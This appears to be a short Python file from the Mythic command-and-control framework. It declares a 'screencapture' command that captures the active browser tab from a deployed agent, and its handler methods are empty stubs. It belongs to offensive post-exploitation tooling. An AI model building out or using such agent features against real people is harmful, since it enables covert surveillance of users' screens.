from mythic_payloadtype_container.MythicCommandBase import *
import json


class ScreencaptureArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        pass


class ScreencaptureCommand(CommandBase):
    cmd = "screencapture"
    needs_admin = False
    help_cmd = "screencapture"
    description = "Capture a screenshot of the active tab"
    version = 1
    author = "@xorrior"
    argument_class = ScreencaptureArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
